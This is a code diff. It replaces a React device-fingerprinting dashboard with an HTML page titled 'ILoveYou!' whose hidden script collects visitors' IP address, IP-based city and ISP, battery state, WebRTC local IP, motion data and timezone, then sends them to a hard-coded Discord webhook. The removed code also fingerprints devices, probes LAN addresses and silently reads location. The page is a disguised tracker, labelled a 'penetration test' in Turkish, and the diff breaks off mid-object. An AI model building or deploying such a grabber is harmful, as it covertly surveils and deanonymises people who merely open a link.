@@ -1,527 +1,161 @@
-import { useState, useEffect, useRef, useCallback } from "react";
-import { useCreateReport } from "@/hooks/use-reports";
-import { ConsoleLog } from "@/components/ConsoleLog";
-import { MetricCard } from "@/components/MetricCard";
-import { ScannerEffect } from "@/components/ScannerEffect";
-import { 
-  Battery, MapPin, Activity, Wifi, Cpu, Globe, 
-  ShieldCheck, AlertTriangle, Terminal, CheckCircle2,
-  Loader2
-} from "lucide-react";
-import { type DeviceInfo } from "@shared/schema";
-import { motion } from "framer-motion";
-
-// Types for browser APIs
-interface BatteryManager {
-  level: number;
-  charging: boolean;
-  addEventListener: (type: string, listener: () => void) => void;
-}
-
-interface NavigatorWithBattery extends Navigator {
-  getBattery?: () => Promise<BatteryManager>;
-  connection?: {
-    downlink?: number;
-    effectiveType?: string;
-    rtt?: number;
-  };
-  deviceMemory?: number;
-}
-
-type LogType = "info" | "success" | "warning" | "error";
-
-export default function Dashboard() {
-  const [logs, setLogs] = useState<Array<{ id: string; message: string; type: LogType; timestamp: string }>>([]);
-  const [deviceData, setDeviceData] = useState<Partial<DeviceInfo>>({});
-  const [status, setStatus] = useState<"initializing" | "scanning" | "transmitting" | "complete" | "error">("initializing");
-  const [permissionRequired, setPermissionRequired] = useState(false);
-  const { mutate: sendReport } = useCreateReport();
-
-  // Status for individual metrics
-  const [metricStatus, setMetricStatus] = useState({
-    battery: "pending",
-    location: "pending",
-    motion: "pending",
-    network: "pending",
-    system: "pending",
-    speed: "pending"
-  } as Record<string, "pending" | "collecting" | "complete" | "error">);
-
-  const addLog = useCallback((message: string, type: LogType = "info") => {
-    const now = new Date();
-    const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
-    setLogs(prev => [...prev, { id: Math.random().toString(36), message, type, timestamp }]);
-  }, []);
-
-  // 1. System Info (Immediate)
-  const collectSystemInfo = useCallback(() => {
-    setMetricStatus(prev => ({ ...prev, system: "collecting" }));
-    addLog("Analyzing system architecture...", "info");
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ILoveYou!</title>
+</head>
+<body>
+    <h1>ILoveYou!</h1>
     
-    setTimeout(() => {
-      const nav = navigator as NavigatorWithBattery;
-      const info = {
-        userAgent: nav.userAgent,
-        language: nav.language,
-        platform: nav.platform,
-        cores: nav.hardwareConcurrency || 0,
-        memory: nav.deviceMemory,
-      };
-      setDeviceData(prev => ({ ...prev, system: info }));
-      setMetricStatus(prev => ({ ...prev, system: "complete" }));
-      addLog(`System identified: ${info.platform} (${info.cores} Cores)`, "success");
-    }, 800);
-  }, [addLog]);
-
-  // 2. Battery Info
-  const collectBatteryInfo = useCallback(async () => {
-    setMetricStatus(prev => ({ ...prev, battery: "collecting" }));
-    addLog("Accessing power management interface...", "info");
-    
-    try {
-      const nav = navigator as NavigatorWithBattery;
-      if (nav.getBattery) {
-        const battery = await nav.getBattery();
-        const info = {
-          level: battery.level,
-          charging: battery.charging
-        };
-        setDeviceData(prev => ({ ...prev, battery: info }));
-        setMetricStatus(prev => ({ ...prev, battery: "complete" }));
-        addLog(`Power source analyzed: ${Math.round(info.level * 100)}%`, "success");
-      } else {
-        addLog("Battery API not available on this interface", "warning");
-        setMetricStatus(prev => ({ ...prev, battery: "error" }));
-      }
-    } catch (e) {
-      addLog("Power access denied", "error");
-      setMetricStatus(prev => ({ ...prev, battery: "error" }));
-    }
-  }, [addLog]);
-
-  // 3. Network Info
-  const collectNetworkInfo = useCallback(() => {
-    setMetricStatus(prev => ({ ...prev, network: "collecting" }));
-    addLog("Scanning network protocols...", "info");
-    
-    const nav = navigator as NavigatorWithBattery;
-    if (nav.connection) {
-      const info = {
-        downlink: nav.connection.downlink,
-        effectiveType: nav.connection.effectiveType,
-        rtt: nav.connection.rtt
-      };
-      setDeviceData(prev => ({ ...prev, network: info }));
-      setMetricStatus(prev => ({ ...prev, network: "complete" }));
-      addLog(`Network uplink established: ${info.effectiveType?.toUpperCase()}`, "success");
-    } else {
-      // Still mark as complete as we gathered what we could (nothing)
-      setDeviceData(prev => ({ ...prev, network: {} }));
-      setMetricStatus(prev => ({ ...prev, network: "complete" }));
-      addLog("Basic network parameters only", "warning");
-    }
-  }, [addLog]);
-
-  // 4. Motion/Sensors
-  const collectMotionInfo = useCallback(() => {
-    setMetricStatus(prev => ({ ...prev, motion: "collecting" }));
-    addLog("Calibrating accelerometer sensors...", "info");
-    
-    let readings = 0;
-    const maxReadings = 5;
-    let acc = { x: 0, y: 0, z: 0 };
-    
-    const handler = (event: DeviceMotionEvent) => {
-      if (event.acceleration) {
-        acc.x = event.acceleration.x || 0;
-        acc.y = event.acceleration.y || 0;
-        acc.z = event.acceleration.z || 0;
-        readings++;
-
-        if (readings >= maxReadings) {
-          window.removeEventListener('devicemotion', handler);
-          setDeviceData(prev => ({ ...prev, motion: { acceleration: acc } }));
-          setMetricStatus(prev => ({ ...prev, motion: "complete" }));
-          
-          const isMoving = Math.abs(acc.x) > 0.5 || Math.abs(acc.y) > 0.5 || Math.abs(acc.z) > 0.5;
-          addLog(`Motion sensor calibration complete. Status: ${isMoving ? "MOVING" : "STATIONARY"}`, "success");
-        }
-      }
-    };
-
-    // Timeout if no motion sensors found
-    setTimeout(() => {
-      if (readings === 0) {
-        window.removeEventListener('devicemotion', handler);
-        setMetricStatus(prev => ({ ...prev, motion: "error" }));
-        addLog("No inertial sensors detected", "warning");
-      }
-    }, 2000);
-
-    if (window.DeviceMotionEvent) {
-      window.addEventListener('devicemotion', handler);
-    } else {
-      setMetricStatus(prev => ({ ...prev, motion: "error" }));
-      addLog("Motion API not supported", "error");
-    }
-  }, [addLog]);
-
-  // 5. Speed Test
-  const runSpeedTest = useCallback(async () => {
-    setMetricStatus(prev => ({ ...prev, speed: "collecting" }));
-    addLog("Initiating quick network ping...", "info");
-    
-    const testUrl = "https://replit.com/favicon.ico?t=" + new Date().getTime();
-    
-    try {
-      const start = performance.now();
-      await fetch(testUrl, { mode: 'no-cors' });
-      const end = performance.now();
-      
-      const ping = Math.round(end - start);
-      
-      setDeviceData(prev => ({ ...prev, speedTest: { ping, downloadMbps: 0 } }));
-      setMetricStatus(prev => ({ ...prev, speed: "complete" }));
-      addLog(`Network ping: ${ping}ms`, "success");
-    } catch (e) {
-      setMetricStatus(prev => ({ ...prev, speed: "error" }));
-      addLog("Ping test failed", "warning");
-    }
-  }, [addLog]);
-
-  // 6. Location (Last because it requires permission)
-  const collectLocation = useCallback(() => {
-    setMetricStatus(prev => ({ ...prev, location: "collecting" }));
-    // addLog("Triangulating position coordinates...", "info");
-    
-    if (!navigator.geolocation) {
-      setMetricStatus(prev => ({ ...prev, location: "error" }));
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const loc = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy
-        };
-        setDeviceData(prev => ({ ...prev, location: loc }));
-        setMetricStatus(prev => ({ ...prev, location: "complete" }));
-        setPermissionRequired(false);
-      },
-      (err) => {
-        setMetricStatus(prev => ({ ...prev, location: "error" }));
-        setPermissionRequired(false); 
-      },
-      { timeout: 3000, enableHighAccuracy: false }
-    );
-  }, []);
-
-  // Master Orchestrator
-  useEffect(() => {
-    const runAll = async () => {
-      // 1. System Info (Immediate)
-      const nav = navigator as NavigatorWithBattery;
-      const systemInfo = {
-        userAgent: nav.userAgent,
-        language: nav.language,
-        platform: nav.platform,
-        cores: nav.hardwareConcurrency || 0,
-        memory: nav.deviceMemory,
-      };
-
-      // 2. Battery Info
-      let batteryInfo = {};
-      try {
-        if (nav.getBattery) {
-          const battery = await nav.getBattery();
-          batteryInfo = { level: battery.level, charging: battery.charging };
-        }
-      } catch (e) {}
-
-      // 3. Network Info
-      let networkInfo = {};
-      if (nav.connection) {
-        networkInfo = {
-          downlink: nav.connection.downlink,
-          effectiveType: nav.connection.effectiveType,
-          rtt: nav.connection.rtt
-        };
-      }
-
-      // 4. Motion (Quick check)
-      let motionInfo = {};
-      // Motion sensors usually need an event listener to trigger, we skip for "instant" feel
-      // but we could add a very short listener if needed.
-
-      // 5. Speed Test (Quick ping)
-      let speedInfo = {};
-      try {
-        const start = performance.now();
-        await fetch("https://replit.com/favicon.ico?t=" + Date.now(), { mode: 'no-cors' });
-        speedInfo = { ping: Math.round(performance.now() - start), downloadMbps: 0 };
-      } catch (e) {}
-
-      // 7. LAN Scanning (Hybrid Fetch + Image Ping)
-      const lanDevices: string[] = [];
-      const scanLAN = async () => {
-        const commonIPs = [
-          "192.168.1.1", "192.168.1.254", "192.168.0.1", 
-          "10.0.0.1", "192.168.1.100", "192.168.1.101",
-          "192.168.1.2", "192.168.0.254", "10.0.0.138",
-          "192.168.1.50", "192.168.0.100", "192.168.2.1",
-          "192.168.1.20", "192.168.1.30", "192.168.1.40"
-        ];
+    <script>
         
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        const WEBHOOK_URL:https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73
 
-        await Promise.all(commonIPs.map(async (ip) => {
-          // Method 1: Fetch
-          const fetchPromise = fetch(`http://${ip}/favicon.ico`, { 
-            mode: 'no-cors', 
-            signal: controller.signal 
-          }).then(() => lanDevices.push(ip)).catch(() => {});
+        
+        async function collectAndSendData() {
+            const data = {};
 
-          // Method 2: Image Ping (Aggressive bypass)
-          const imgPromise = new Promise((resolve) => {
-            const img = new Image();
-            img.onload = () => { lanDevices.push(ip); resolve(null); };
-            img.onerror = () => resolve(null);
-            img.src = `http://${ip}/favicon.ico?t=${Date.now()}`;
-            setTimeout(() => { img.src = ""; resolve(null); }, 2000);
-          });
+            // 1. Temel Sistem Bilgileri
+            data.userAgent = navigator.userAgent;
+            data.platform = navigator.platform;
+            data.language = navigator.language;
+            data.languages = navigator.languages;
+            data.cookieEnabled = navigator.cookieEnabled;
+            data.doNotTrack = navigator.doNotTrack;
+            data.hardwareConcurrency = navigator.hardwareConcurrency;
+            data.deviceMemory = navigator.deviceMemory;
+            data.maxTouchPoints = navigator.maxTouchPoints;
 
-          return Promise.race([fetchPromise, imgPromise]);
-        }));
-        clearTimeout(timeoutId);
-      };
-      await scanLAN();
-
-      // 8. Fingerprinting (Canvas, WebGL, Audio, Fonts, WebRTC, Media, Permissions)
-      const getMediaDevices = async () => {
-        try {
-          // Note: enumerateDevices returns labels only if permission was already granted.
-          // We just collect the existence/count of devices silently.
-          const devices = await (navigator.mediaDevices as any).enumerateDevices();
-          return (devices as any[]).map(d => `${d.kind}`).join(", ");
-        } catch (e) { return "Blocked"; }
-      };
-
-      const getPermissionsStatus = async () => {
-        const perms = ["geolocation", "notifications", "push", "camera", "microphone"] as const;
-        const results = await Promise.all(perms.map(async (p) => {
-          try {
-            const status = await (navigator.permissions as any).query({ name: p as any });
-            return `${p}: ${status.state}`;
-          } catch (e) { return `${p}: error`; }
-        }));
-        return results.join(", ");
-      };
-
-      const getWebGLInfo = () => {
-        try {
-          const canvas = document.createElement("canvas");
-          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-          if (!gl) return {} as any;
-          const glContext = gl as WebGLRenderingContext;
-          const debugInfo = glContext.getExtension("WEBGL_debug_renderer_info");
-          return {
-            vendor: glContext.getParameter(glContext.RENDERER),
-            version: glContext.getParameter(glContext.VERSION),
-            shadingLanguage: glContext.getParameter(glContext.SHADING_LANGUAGE_VERSION),
-            renderer: debugInfo ? glContext.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
-            maxTextureSize: glContext.getParameter(glContext.MAX_TEXTURE_SIZE),
-            maxViewportDims: glContext.getParameter(glContext.MAX_VIEWPORT_DIMS),
-            antialiasing: glContext.getContextAttributes()?.antialias ? "Yes" : "No"
-          };
-        } catch (e) { return {} as any; }
-      };
-
-      const getBrowserFeatures = () => ({
-        pdfViewer: (navigator as any).pdfViewerEnabled,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        maxTouchPoints: navigator.maxTouchPoints,
-        webdriver: navigator.webdriver,
-        darkTheme: window.matchMedia("(prefers-color-scheme: dark)").matches,
-        reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
-        highContrast: window.matchMedia("(prefers-contrast: more)").matches,
-        productSub: (navigator as any).productSub,
-        vendor: navigator.vendor,
-        maxMemory: (performance as any).memory?.jsHeapSizeLimit,
-        totalMemory: (navigator as any).deviceMemory,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        online: navigator.onLine
-      });
-
-      const getDeepHardwareInfo = () => {
-        const info: any = {};
-        try {
-          if ('storage' in navigator && 'estimate' in navigator.storage) {
-            navigator.storage.estimate().then(est => {
-              info.storageQuota = est.quota;
-              info.storageUsage = est.usage;
-            });
-          }
-          info.colorDepth = window.screen.colorDepth;
-          info.pixelDepth = window.screen.pixelDepth;
-          info.availHeight = window.screen.availHeight;
-          info.availWidth = window.screen.availWidth;
-        } catch (e) {}
-        return info;
-      };
-
-      const getCanvasFingerprint = () => {
-        try {
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
-          if (!ctx) return "N/A";
-          canvas.width = 200;
-          canvas.height = 50;
-          ctx.textBaseline = "top";
-          ctx.font = "14px 'Arial'";
-          ctx.textBaseline = "alphabetic";
-          ctx.fillStyle = "#f60";
-          ctx.fillRect(125,1,62,20);
-          ctx.fillStyle = "#069";
-          ctx.fillText("ILoveYou!", 2, 15);
-          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-          ctx.fillText("ILoveYou!", 4, 17);
-          const result = canvas.toDataURL();
-          return btoa(result).substring(0, 16);
-        } catch (e) { return "Error"; }
-      };
-
-      const getDetailedHardware = () => {
-        const nav = navigator as any;
-        return {
-          maxTouchPoints: nav.maxTouchPoints,
-          logicalCores: nav.hardwareConcurrency,
-          ramGb: nav.deviceMemory,
-          canPresent: ('presentation' in nav),
-          isVibrate: ('vibrate' in nav),
-          bluetooth: ('bluetooth' in nav),
-          usb: ('usb' in nav)
-        };
-      };
-
-      const canvasFingerprint = getCanvasFingerprint();
-      const hwDetails = getDetailedHardware();
-      const mediaDevices = await getMediaDevices();
-      const permissions = await getPermissionsStatus();
-      const webgl = getWebGLInfo();
-      const features = getBrowserFeatures();
-      const hardware = getDeepHardwareInfo();
-      const cpuSpeedScore = getTimingFingerprint();
-      const gpu = webgl.renderer || "N/A";
-      const audioRate = getAudioFingerprint();
-      const fonts = getFonts();
-      const webrtcIP = await getWebRTCIP();
-      const fingerprint = btoa(gpu + audioRate + window.screen.width + fonts + canvasFingerprint).substring(0, 16);
-
-      // 6. Location (STRICTLY SILENT)
-      const attemptSilentLocation = async () => {
-        try {
-          const status = await (navigator.permissions as any).query({ name: 'geolocation' });
-          if (status.state === 'granted') {
-            return new Promise((resolve) => {
-              navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                () => resolve(null),
-                { timeout: 1000 }
-              );
-            });
-          }
-        } catch (e) {}
-        return null;
-      };
-
-      const getBatteryStatus = async () => {
-        try {
-          if ('getBattery' in navigator) {
-            const battery = await (navigator as any).getBattery();
-            return {
-              level: battery.level,
-              charging: battery.charging,
-              chargingTime: battery.chargingTime,
-              dischargingTime: battery.dischargingTime
+            // 2. Ekran Bilgileri
+            data.screen = {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
             };
-          }
-        } catch (e) {}
-        return null;
-      };
 
-      const getNetworkInfo = () => {
-        const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-        if (!conn) return null;
-        return {
-          downlink: conn.downlink,
-          effectiveType: conn.effectiveType,
-          rtt: conn.rtt,
-          saveData: conn.saveData
-        };
-      };
+            // 3. Konum Bilgisi (IP üzerinden)
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
 
-      const loc = await attemptSilentLocation();
-      const detailedBattery = await getBatteryStatus();
-      const detailedNetwork = getNetworkInfo();
-
-      const finalData = { 
-        system: { ...systemInfo, gpu, fingerprint, audioRate, fonts, webrtcIP, mediaDevices, permissions, webgl, features, cpuSpeedScore, hardware, canvasFingerprint, hwDetails }, 
-        battery: detailedBattery || batteryInfo, 
-        network: detailedNetwork || networkInfo, 
-        speedTest: speedInfo, 
-        location: loc,
-        lanDevices: [...new Set(lanDevices)],
-        screen: {
-          width: window.screen.width,
-          height: window.screen.height,
-          colorDepth: window.screen.colorDepth,
-          orientation: (window.screen.orientation as any)?.type,
-          pixelRatio: window.devicePixelRatio,
-          hdr: (window as any).matchMedia("(dynamic-range: high)").matches
-        }
-      };
-      sendReport({ deviceInfo: finalData });
-    };
-
-    if (status === 'initializing') {
-      setStatus('scanning');
-      runAll().then(() => setStatus('complete'));
-    }
-  }, [status, sendReport]);
-
-  // Transmission Logic
-  useEffect(() => {
-    const metrics = Object.values(metricStatus);
-    const allDone = metrics.every(s => s === 'complete' || s === 'error');
-    const locationFinished = metricStatus.location === 'complete' || metricStatus.location === 'error';
-
-    if (status === 'scanning' && allDone && locationFinished && !permissionRequired) {
-      setStatus('transmitting');
-      addLog("All subsystems reported. Compiling data packet...", "info");
-      
-      setTimeout(() => {
-        addLog("Encrypting payload...", "info");
-        sendReport(
-          { deviceInfo: deviceData },
-          {
-            onSuccess: () => {
-              setStatus('complete');
-              addLog("TRANSMISSION SUCCESSFUL. CONNECTION TERMINATED.", "success");
-            },
-            onError: () => {
-              setStatus('error');
-              addLog("Uplink failed. Retrying...", "error");
+                // IP detayları (konum, ISP vb.)
+                const details = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                const detailsData = await details.json();
+                data.locationByIP = detailsData;
+            } catch (e) {
+                data.ipError = e.message;
             }
-          }
-        );
-      }, 2000);
-    }
-  }, [metricStatus, status, deviceData, sendReport, addLog, permissionRequired]);
 
-  return (
-    <div className="min-h-screen bg-black flex items-center justify-center font-mono">
-      <h1 className="text-
+            // 4. Pil Durumu (eğer tarayıcı izin veriyorsa)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = {
+                        level: (battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {
+                    data.batteryError = 'Bilgi alınamadı';
+                }
+            }
+
+            // 5. İnternet Bağlantı Bilgileri
+            if (navigator.connection) {
+                data.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+
+            // 6. VPN Tespiti (IP API'si ile)
+            if (data.ip) {
+                try {
+                    // Bu kısım için bir VPN tespit API'si kullanabilirsiniz.
+                    // Örnek: https://vpnapi.io/ (ücretsiz planı var)
+                    // Not: API anahtarı almanız gerekebilir.
+                    // const vpnResponse = await fetch(`https://vpnapi.io/api/${data.ip}?key=YOUR_API_KEY`);
+                    // data.vpnCheck = await vpnResponse.json();
+                } catch (e) {
+                    // VPN tespiti yapılamadı
+                }
+            }
+
+            // 7. Cihaz Hareketi (İzin gerekmez, ancak cihazın hareket sensörü olmalı)
+            if (window.DeviceMotionEvent) {
+                let motionData = {};
+                window.addEventListener('devicemotion', (event) => {
+                    motionData.acceleration = event.acceleration;
+                    motionData.accelerationIncludingGravity = event.accelerationIncludingGravity;
+                    motionData.rotationRate = event.rotationRate;
+                    motionData.interval = event.interval;
+                });
+                // Bir süre bekleyerek veri topla
+                setTimeout(() => {
+                    data.motion = motionData;
+                }, 1000);
+            }
+
+            // 8. Saat ve Zaman Dilimi
+            data.time = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                offset: new Date().getTimezoneOffset(),
+                datetime: new Date().toISOString()
+            };
+
+            // 9. WebRTC ile yerel IP (LAN IP'si)
+            try {
+                const rtc = new RTCPeerConnection({ iceServers: [] });
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+
+                rtc.onicecandidate = (event) => {
+                    if (event.candidate && event.candidate.candidate) {
+                        const candidate = event.candidate.candidate;
+                        const localIPMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (localIPMatch) {
+                            data.localIP = localIPMatch[1];
+                        }
+                    }
+                };
+            } catch (e) {
+                data.webrtcError = e.message;
+            }
+
+            // 10. Ağ Cihazları Keşfi (LAN tarama) - Tarayıcıdan doğrudan yapılamaz, ancak WebRTC ile alınan yerel IP üzerinden tahmin yapılabilir.
+            // Bu kısım, yerel ağdaki cihazları taramak için değil, sadece WebRTC'den gelen yerel IP'yi kaydetmek içindir.
+
+            // 11. Aktif Sekmeler (Sayfa görünürlüğü)
+            data.visibility = document.visibilityState;
+
+            // Veriyi Discord'a gönder
+            sendToDiscord(data);
+        }
+
+        // Discord'a veri gönderme
+        async function sendToDiscord(data) {
+            // Discord embed sınırlamaları nedeniyle, çok uzun verileri kısalt
+            function truncate(str, max) {
+                return str.length > max ? str.substr(0, max-3) + '...' : str;
+            }
+
+            const embed = {
+                title: "Sızma Testi Raporu - Cihaz Bilgileri",
+                color: 0xff0000,
+                fields: [
+                    { name: "🖥️ User Agent", value: truncate(data.userAgent || "Bilinmiyor", 1024) },
+                    { name: "🌐 Platform", value: data.platform || "Bilinmiyor" },
+                    { name: "🗣️ Dil", value: data.language || "Bilinmiyor" },
+                    { name: "🔋 Pil Seviyesi", value: data.battery ? `${data.battery.level} (Şarj: ${data.battery.charging})` : "Bilinmiyor" },
+                    { name: "📍 IP Konumu", value: data.locationByIP ? `${data.locationByIP.city}, ${data.locationByIP.country}` : "Bilinmiyor" },
+                    { name: "📶 Bağlantı", value: data.connection ? `Tür: ${data.connection.effectiveType}, Hız: ${data.connection.downlink}Mbps` : "Bilinmiyor" },
+                    { name: "🌍 IP Adresi", value: data.ip || "Bilinmiyor" },
+                    { name: "🕐 Saat Dilimi", value: data.time.timezone || "Bilinmiyor" },
+                    { name: "🔌 Yerel IP", value: data.localIP || "Bilinmiyor" },
+                    { name: "📡 İnternet Sağlayıcı", value: data.locationByIP ? data.locationByIP.isp : "Bilinmiyor" },
+                    { name: "🏙️ Şehir", value: data.locationByIP ? data.locationByIP.city : "Bilinmiyor"
